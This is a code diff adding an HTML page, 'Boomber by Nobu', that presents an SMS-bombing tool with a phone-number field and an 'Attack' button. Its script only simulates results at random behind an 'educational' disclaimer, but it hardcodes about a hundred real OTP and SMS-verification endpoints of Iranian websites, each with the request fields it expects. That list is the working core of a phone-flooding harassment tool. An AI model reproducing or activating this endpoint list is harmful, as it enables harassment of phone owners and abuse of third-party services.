@@ -1,0 +1,461 @@
+ <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Boomber by Nobu</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background-color: #f5f5f5;
+            padding: 20px;
+            color: #333;
+        }
+        
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            background-color: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+        }
+        
+        h1 {
+            text-align: center;
+            margin-bottom: 20px;
+            color: #2c3e50;
+        }
+        
+        .disclaimer {
+            background-color: #fff3cd;
+            color: #856404;
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            border-left: 4px solid #ffeeba;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        
+        input[type="text"] {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        
+        button {
+            background-color: #3498db;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            width: 100%;
+            transition: background-color 0.3s;
+            margin-bottom: 20px;
+        }
+        
+        button:hover {
+            background-color: #2980b9;
+        }
+        
+        button:disabled {
+            background-color: #cccccc;
+            cursor: not-allowed;
+        }
+        
+        .result {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 5px;
+            display: none;
+        }
+        
+        .success {
+            background-color: #d4edda;
+            color: #155724;
+            border-left: 4px solid #c3e6cb;
+        }
+        
+        .error {
+            background-color: #f8d7da;
+            color: #721c24;
+            border-left: 4px solid #f5c6cb;
+        }
+        
+        .api-list {
+            margin-top: 30px;
+        }
+        
+        .api-list h3 {
+            margin-bottom: 15px;
+            color: #2c3e50;
+        }
+        
+        .api-scroll {
+            max-height: 300px;
+            overflow-y: auto;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            padding: 15px;
+        }
+        
+        .api-item {
+            padding: 10px;
+            border-bottom: 1px solid #eee;
+        }
+        
+        .api-item:last-child {
+            border-bottom: none;
+        }
+        
+        .api-name {
+            font-weight: bold;
+            color: #3498db;
+        }
+        
+        .api-url {
+            font-size: 14px;
+            color: #7f8c8d;
+            word-break: break-all;
+        }
+        
+        .progress-container {
+            width: 100%;
+            height: 20px;
+            background-color: #f1f1f1;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            display: none;
+        }
+        
+        .progress-bar {
+            height: 100%;
+            background-color: #3498db;
+            border-radius: 10px;
+            width: 0%;
+            transition: width 0.3s;
+        }
+        
+        .stats {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 20px;
+        }
+        
+        .stat-box {
+            flex: 1;
+            text-align: center;
+            padding: 15px;
+            background-color: #f8f9fa;
+            border-radius: 5px;
+            margin: 0 5px;
+        }
+        
+        .stat-number {
+            font-size: 24px;
+            font-weight: bold;
+            color: #3498db;
+        }
+        
+        .stat-label {
+            font-size: 14px;
+            color: #7f8c8d;
+        }
+        
+        .log-container {
+            margin-top: 20px;
+            max-height: 200px;
+            overflow-y: auto;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            padding: 15px;
+            background-color: #f8f9fa;
+            display: none;
+        }
+        
+        .log-entry {
+            padding: 5px 0;
+            border-bottom: 1px solid #eee;
+            font-family: monospace;
+            font-size: 14px;
+        }
+        
+        .log-entry:last-child {
+            border-bottom: none;
+        }
+        
+        .success-log {
+            color: #27ae60;
+        }
+        
+        .error-log {
+            color: #e74c3c;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Boomber by Nobu</h1>
+        
+        <div class="disclaimer">
+            <strong>Disclaimer:</strong> This is a demonstration only. Actual SMS bombing is illegal in most jurisdictions. This simulator does not actually send any messages and is for educational purposes only.
+        </div>
+        
+        <div class="form-group">
+            <label for="phone">Phone Number:</label>
+            <input type="text" id="phone" placeholder="Enter phone number without 0 (e.g., 123456789)" maxlength="10">
+        </div>
+        
+        <button id="start-btn">Attack</button>
+        
+        <div class="progress-container" id="progress-container">
+            <div class="progress-bar" id="progress-bar"></div>
+        </div>
+        
+        <div class="stats">
+            <div class="stat-box">
+                <div class="stat-number" id="total-apis">0</div>
+                <div class="stat-label">Total APIs</div>
+            </div>
+            <div class="stat-box">
+                <div class="stat-number" id="success-count">0</div>
+                <div class="stat-label">Successful</div>
+            </div>
+            <div class="stat-box">
+                <div class="stat-number" id="failed-count">0</div>
+                <div class="stat-label">Failed</div>
+            </div>
+        </div>
+        
+        <div class="log-container" id="log-container">
+            <div class="log-entry">Log will appear here...</div>
+        </div>
+        
+        <div id="result" class="result"></div>
+        
+        <div class="api-list">
+            <h3>Available APIs for Simulation</h3>
+            <div class="api-scroll" id="api-scroll">
+                <!-- APIs will be listed here -->
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const startBtn = document.getElementById('start-btn');
+            const phoneInput = document.getElementById('phone');
+            const resultDiv = document.getElementById('result');
+            const progressContainer = document.getElementById('progress-container');
+            const progressBar = document.getElementById('progress-bar');
+            const logContainer = document.getElementById('log-container');
+            const totalApisElement = document.getElementById('total-apis');
+            const successCountElement = document.getElementById('success-count');
+            const failedCountElement = document.getElementById('failed-count');
+            const apiScrollElement = document.getElementById('api-scroll');
+            
+            // API data
+            const apis = [
+                { name: 'komodaa', url: 'https://api.komodaa.com/api/v2.6/loginRC/request', payload: {"phone_number": ""} },
+                { name: 'janebi', url: 'https://janebi.com/signin?do', payload: {"resend": ""} },
+                { name: '4hair', url: 'https://4hair.ir/user/login.php', payload: {"num": "", "ok": ""} },
+                { name: 'igame', url: 'https://igame.ir/api/play/otp/send', payload: {"phone": ""} },
+                { name: 'karlancer', url: 'https://www.karlancer.com/api/register', payload: {"phone": "", "role": "freelancer"} },
+                { name: 'hsaria', url: 'https://www.hsaria.com/MemberRegisterLogin', payload: {"phone": ""} },
+                { name: 'twsms', url: 'https://twsms.ir/client/register.php', payload: {"mobile": "", "agree": "agree", "sendsms": "1"} },
+                { name: 'baradarantoy', url: 'https://baradarantoy.ir/send_confirm_sms_ajax.php', payload: {"user_tel": ""} },
+                { name: 'kavirmotor', url: 'https://kavirmotor.com/sms/send', payload: {"phoneNumber": ""} },
+                { name: 'chechilas', url: 'https://chechilas.com/user/login', payload: {"mob": ""} },
+                { name: 'badparak', url: 'https://badparak.com/register/request_verification_code', payload: {"mobile": ""} },
+                { name: 'hermeskala', url: 'https://hermeskala.com//login/send_vcode', payload: {"mobile_number": ""} },
+                { name: 'elinorboutique', url: 'https://api.elinorboutique.com/v1/customer/register-login', payload: {"mobile": ""} },
+                { name: 'atlasmode', url: 'https://api.atlasmode.ir/v1/customer/register-login?version=new2', payload: {"mobile": ""} },
+                { name: 'pooshakshoniz', url: 'https://api.pooshakshoniz.com/v1/customer/register-login?version=new1', payload: {"mobile": ""} },
+                { name: 'ubike', url: 'https://ubike.ir/index.php?route=extension/module/websky_otp/send_code', payload: {"telephone": ""} },
+                { name: 'benedito', url: 'https://api.benedito.ir/v1/customer/register-login?version=new1', payload: {"mobile": ""} },
+                { name: 'rubeston', url: 'https://www.rubeston.com/api/customers/login-register', payload: {"mobile": "", "step": "1"} },
+                { name: 'primashop', url: 'https://primashop.ir/index.php?route=extension/module/websky_otp/send_code', payload: {"telephone": ""} },
+                { name: 'payagym', url: 'https://payagym.com/wp-admin/admin-ajax.php', payload: {"mobile": "", "action": "kerasno_proform_register_inline_send"} },
+                { name: 'bartarinha', url: 'https://bartarinha.com/Advertisement/Users/RequestLoginMobile', payload: {"mobileNo": "", "X-Requested-With": "XMLHttpRequest"} },
+                { name: 'manoshahr', url: 'https://manoshahr.ir/jq.php', payload: {"mobile": "", "class_name": "public_login", "function_name": "sendCode"} },
+                { name: 'nalinoco', url: 'https://www.nalinoco.com/api/customers/login-register', payload: {"mobile": "", "ReturnUrl": "/", "step": "1"} },
+                { name: 'hiss', url: 'https://hiss.ir/wp-admin/admin-ajax.php', payload: {"phone_email": "", "action": "bakala_send_code"} },
+                { name: 'tahrir-online', url: 'https://tahrir-online.ir/wp-admin/admin-ajax.php', payload: {"phone": "", "form": "register", "action": "mobix_send_otp_code"} },
+                { name: 'snapp', url: 'https://app.snapp.taxi/api/api-passenger-oauth/v2/otp', payload: {"cellphone": ""} },
+                { name: 'martday', url: 'https://martday.ir/api/customer/member/register/', payload: {"email": "", "accept_term": "on"} },
+                { name: 'paaakar', url: 'https://api.paaakar.com/v1/customer/register-login?version=new1', payload: {"mobile": ""} },
+                { name: 'electrastore', url: 'https://electrastore.ir/index.php?route=extension/module/websky_otp/send_code', payload: {"telephone": ""} },
+                { name: 'atrinelec', url: 'https://www.atrinelec.com/ajax/SendSmsVerfiyCode', payload: {"mobile": ""} },
+                { name: 'ketabweb', url: 'https://ketabweb.com/login/?usernameCheck=1', payload: {"username": ""} },
+                { name: 'dastaneman', url: 'https://dastaneman.com/User/SendCode', payload: {"mobile": ""} },
+                { name: '80w', url: 'https://80w.ir/wp-admin/admin-ajax.php', payload: {"login": "", "action": "logini_first"} },
+                { name: 'noavarpub', url: 'https://noavarpub.com/logins/login.php?ref=https%3A%2F%2Fnoavarpub.com%2F', payload: {"phone": "", "submit": "123"} },
+                { name: 'hovalvakil', url: 'https://api.hovalvakil.com/api/User/SendConfirmCode?userName=', payload: null },
+                { name: 'digighate', url: 'https://api.digighate.com/v2/public/code?phone=', payload: null },
+                { name: 'azarbadbook', url: 'https://azarbadbook.ir/ajax/login_j_ajax_ver/', payload: {"phone": ""} },
+                { name: 'kanoonbook', url: 'https://www.kanoonbook.ir/store/customer_otp', payload: {"customer_username": "", "task": "customer_phone"} },
+                { name: 'cheshmandazketab', url: 'https://www.cheshmandazketab.ir/Register', payload: {"phone": "", "login": "1"} },
+                { name: 'ketabir', url: 'https://sso-service.ketab.ir/api/v2/signup/otp?Mobile=', payload: null },
+                { name: 'snappshop', url: 'https://apix.snappshop.co/auth/v1/pre-login?lat=35.77331&lng=51.418591', payload: {"mobile": ""} },
+                { name: 'ketabium', url: 'https://www.ketabium.com/login-register', payload: {"username": ""} },
+                { name: 'rirabook', url: 'https://rirabook.com/loginAth', payload: {"mobile1": "", "loginbt1": ""} },
+                { name: 'pashikshoes', url: 'https://api.pashikshoes.com/v1/customer/register-login', payload: {"mobile": ""} },
+                { name: 'shimashoes', url: 'https://shimashoes.com/api/customer/member/register/', payload: {"email": ""} },
+                { name: 'lendo', url: 'https://api.lendo.ir/api/customer/auth/send-otp', payload: {"mobile": ""} },
+                { name: 'buskool', url: 'https://www.buskool.com/send_verification_code', payload: {"phone": ""} },
+                { name: 'tamimpishro', url: 'https://www.tamimpishro.com/site/api/v1/user/otp', payload: {"mobile": ""} },
+                { name: 'fafait', url: 'https://api2.fafait.net/oauth/check-user', payload: {"id": ""} },
+                { name: 'sheypoor', url: 'https://www.sheypoor.com/api/v10.0.0/auth/send', payload: {"username": ""} },
+                { name: 'itoll', url: 'https://app.itoll.com/api/v1/auth/login', payload: {"mobile": ""} },
+                { name: 'banimode', url: 'https://mobapi.banimode.com/api/v2/auth/request', payload: {"phone": ""} },
+                { name: 'torob', url: 'https://api.torob.com/v4/user/phone/send-pin', payload: {"phone_number": ""} },
+                { name: 'basalam', url: 'https://auth.basalam.com/otp-request', payload: {"mobile": ""} },
+                { name: 'khanoumi', url: 'https://www.khanoumi.com/accounts/sendotp', payload: {"mobile": "", "redirectUrl": ""} },
+                { name: 'fankala', url: 'https://fankala.com/wp-admin/admin-ajax.php', payload: {"action": "verify_user_login", "user": "", "captcha": ""} },
+                { name: 'arastag', url: 'https://arastag.ir/wp-admin/admin-ajax.php', payload: {"action": "verify_user_login", "user": "", "captcha": ""} },
+                { name: 'drdr', url: 'https://drdr.ir/api/registerEnrollment/verifyMobile', payload: {"phoneNumber": "", "userType": "PATIENT"} },
+                { name: 'itoll', url: 'https://app.itoll.ir/api/v1/auth/login', payload: {"mobile": ""} },
+                { name: 'telewebion', url: 'https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one', payload: {"code": "98", "phone": "", "smsStatus": "default"} },
+                { name: 'gap', url: 'https://core.gap.im/v1/user/add.json', payload: {"mobile": ""} },
+                { name: 'caropex', url: 'https://caropex.com/api/v1/user/login', payload: {"mobile": ""} },
+                { name: 'namava', url: 'https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request', payload: {"UserName": ""} },
+                { name: 'snappapps', url: 'https://api.snapp.ir/api/v1/sms/link', payload: {"phone": ""} },
+                { name: 'novinmedical', url: 'https://novinmedical.com/wp-admin/admin-ajax.php', payload: {"action": "stm_login_register", "type": "mobile", "input": ""} },
+                { name: 'hamrahsport', url: 'https://hamrahsport.com/send-otp', payload: {"cell": "", "name": "persian_string", "agree": "1", "send_otp": "1", "otp": ""} },
+                { name: 'harikashop', url: 'https://harikashop.com/login?back=my-account', payload: {"username": "", "id_customer": "", "back": ["", "https://harikashop.com/login?back=my-account"], "firstname": "persian_string", "lastname": "persian_string", "password": "random_password", "action": "register", "ajax": "1"} },
+                { name: 'zzzagros', url: 'https://www.zzzagros.com/wp-admin/admin-ajax.php', payload: {"action": "ywp_ajax_register", "ywp_register": "1", "ywp_reg_mobile": "", "ywp_reg_password": "random_password", "ajax_woocommerce_register_nonce": ""} },
+                { name: 'dalfak', url: 'https://www.dalfak.com/api/auth/sendVerificationCode', payload: {"type": 1, "value": ""} },
+                { name: 'doctoreto', url: 'https://api.doctoreto.com/api/web/patient/v1/accounts/register', payload: {"country_id": 205, "mobile": ""} },
+                { name: 'digikalacall', url: 'https://api.digikala.com/v1/user/authenticate/', payload: {"backUrl": "/", "username": "", "otp_call": "true"} },
+                { name: 'okala', url: 'https://api-react.okala.com/C/CustomerAccount/OTPRegister', payload: {"mobile": "", "deviceTypeCode": 0, "confirmTerms": "true", "notRobot": "false"} },
+                { name: 'digikala', url: 'https://api.digikala.com/v1/user/authenticate/', payload: {"backUrl": "/", "username": "", "otp_call": "false"} },
+                { name: 'mellishoes', url: 'https://mellishoes.ir/wp-admin/admin-ajax.php', payload: {"action": "websima_auth_account_detection", "account_detection_nonce_field": "21737b7e2d", "mobile": "", "_wp_http_referer": "/"} },
+                { name: 'setshoe', url: 'https://setshoe.ir/wp-admin/admin-ajax.php', payload: {"action": "stm_login_register", "type": "mobile", "input": ""} },
+                { name: 'maxbax', url: 'https://maxbax.com/wp-admin/admin-ajax.php', payload: {"action": "bakala_send_code", "phone_email": ""} },
+                { name: 'shikstyle', url: 'https://shik.style/wp-admin/admin-ajax.php', payload: {"action": "login", "form=phone": ""} },
+                { name: 'parkbag', url: 'https://parkbag.com/fa/Account/RegisterOrLoginByMobileNumber', payload: {"ReturnUrl": "https://parkbag.com/", "MobaileNumber": ""} },
+                { name: 'digistyle', url: 'https://www.digistyle.com/users/login-register/', payload: {"loginRegister[email_phone]": ""} },
+                { name: 'telketab', url: 'https://telketab.com/opt_field/check_secret', payload: {"identity": "", "secret": "", "plugin": "otp_field_sms_processor", "key": "otp_field_user_auth_form__otp_sms"} },
+                { name: 'adinehbook', url: 'https://www.adinehbook.com/gp/flex/sign-in.html', payload: {"action": "sign", "phone_cell_or_email": ""} },
+                { name: 'gitamehr', url: 'https://gitamehr.ir/wp-admin/admin-ajax.php', payload: {"action": "stm_login_register", "type": "mobile", "input": ""} },
+                { name: 'sunnybook', url: 'https://sunnybook.ir/Home/RegisterUser', payload: {"name": "Mr", "password": "123456", "mobile": ""} },
+                { name: 'mahouney', url: 'https://mahouney.com/fa/Account/RegisterOrLoginByMobileNumber', payload: {"ReturnUrl": "https://mahouney.com/", "MobaileNumber": ""} },
+                { name: 'myroz', url: 'https://myroz.ir/wp-admin/admin-ajax.php', payload: {"action": "stm_login_register", "type": "mobile", "input": ""} },
+                { name: 'meidane', url: 'https://meidane.com/accounts/login', payload: {"name": "Mr", "password": "123456", "mobile": ""} },
+                { name: 'ickala', url: 'https://ickala.com/', payload: {"controller": "SendSMS", "fc": "module", "module": "loginbymobile", "SubmitSmsSend": "1", "ajax": "true", "otp_mobile_num": ""} },
+                { name: 'microele', url: 'https://www.microele.com/login?back=my-account', payload: {"id_customer": "", "back": ",my-account", "firstname": "123", "lastname": "123", "password": "123456", "action": "register", "username": "", "ajax": "1"} },
+                { name: 'elecmarket', url: 'https://elecmarket.ir/wp-admin/admin-ajax.php', payload: {"action": "stm_login_register", "type": "mobile", "input": ""} },
+                { name: 'techsiro', url: 'https://techsiro.com/send-otp', payload: {"client": "web", "method": "POST", "_token": "", "mobile": ""} },
+                { name: 'noavarpub', url: 'https://novinparse.com/Page/PageAction.aspx', payload: {"Action": "SendVerifyCode", "verifyCode": "", "repeatFlag": "true", "mobile": ""} },
+                { name: 'titomarket', url: 'https://titomarket.com/index.php?route=account/login_verify/verify', payload: {"redirect": "https://titomarket.com/my-account", "telephone": ""} },
+                { name: 'nikanbike', url: 'https://nikanbike.com/', payload: {"controller": "authentication", "back": "my-account", "fc": "module", "ajax": "true", "module": "iverify", "phone_mobile": "", "SubmitCheck": ""} },
+                { name: 'account724', url: 'https://account724.com/wp-admin/admin-ajax.php', payload: {"action": "stm_login_register", "type": "mobile", "input": ""} },
+                { name: 'eaccount', url: 'https://eaccount.ir/api/v1/sessions/login_request', payload: {"mobile_phone": ""} },
+                { name: 'queenaccessories', url: 'https://queenaccessories.ir/api/v1/sessions/login_request', payload: {"mobile_phone": ""} },
+                { name: 'rastaraccessory', url: 'https://rastaraccessory.ir/api/v1/sessions/login_request', payload: {"mobile_phone": ""} },
+                { name: 'vinaaccessory', url: 'https://vinaaccessory.com/api/v1/sessions/login_request', payload: {"mobile_phone": ""} },
+                { name: 'chortkehshop', url: 'https://chortkehshop.ir/api/v1/sessions/login_request', payload: {"mobile_phone": ""} },
+                { name: 'piinkstore', url: 'https://piinkstore.ir/api/v1/sessions/login_request', payload: {"mobile_phone": ""} },
+                { name: 'dreamlandshop', url: 'https://dreamlandshop.ir/api/v1/sessions/login_request', payload: {"mobile_phone": ""} }
+            ];
+            
+            // apilist
+            
+            startBtn.addEventListener('click', function() {
+                const phone = phoneInput.value.trim();
+                
+                // Validate input
+                if (!phone || isNaN(phone) || phone.length !== 10) {
+                    showResult('Please enter a valid 10-digit phone number (without 0)', 'error');
+                    return;
+                }
+                
+                // Disable button during simulation
+                startBtn.disabled = true;
+                resultDiv.style.display = 'none';
+                progressContainer.style.display = 'block';
+                logContainer.style.display = 'block';
+                logContainer.innerHTML = '';
+                
+                // Reset counters
+                let successCount = 0;
+                let failedCount = 0;
+                successCountElement.textContent = '0';
+                failedCountElement.textContent = '0';
+                
+                // Start simulation
+                simulateSmsBombing(phone, successCount, failedCount);
+            });
+            
+            function simulateSmsBombing(phone, successCount, failedCount) {
+                let completed = 0;
+                
+                addLog('Starting simulation for phone: 0' + phone);
+                
+                // Simulate sending requests to all APIs
+                apis.forEach((api, index) => {
+                    setTimeout(() => {
+                        // Randomly simulate success or failure
+                        const success = Math.random() > 0.3; // 70% success rate
+                        
+                        if (success) {
+                            successCount++;
+                            successCountElement.textContent = successCount;
+                            addLog(`API ${api.name}: Success`, 'success');
+                        } else {
+                            failedCount++;
+                            failedCountElement.textContent = failedCount;
+                            addLog(`API ${api.name}: Failed`, 'error');
+                        }
+                        
+                        // Update progress
+                        completed++;
+                        const progress = (completed / apis.length) * 100;
+                        progressBar.style.width = progress + '%';
+                        
+                        // Check if all completed
+                        if (completed === apis.length) {
+                            showResult(`Simulation completed. Successful: ${successCount}, Failed: ${failedCount}`, 'success');
+                            startBtn.disabled = false;
+                            addLog('Simulation completed');
+                        }
+                    }, index * 100); // Stagger requests
+                });
+            }
+            
+            function showResult(message, type) {
+                resultDiv.textContent = message;
+                resultDiv.className = 'result ' + type;
+                resultDiv.style.display = 'block';
+            }
+            
+            function addLog(message, type = '') {
+                const logEntry = document.createElement('div');
+                logEntry.className = `log-entry ${type}`;
+                logEntry.textContent = message;
+                logContainer.appendChild(logEntry);
+                logContainer.scrollTop = logContainer.scrollHeight;
+            }
+        });
+    </script>
+</body>
+</html
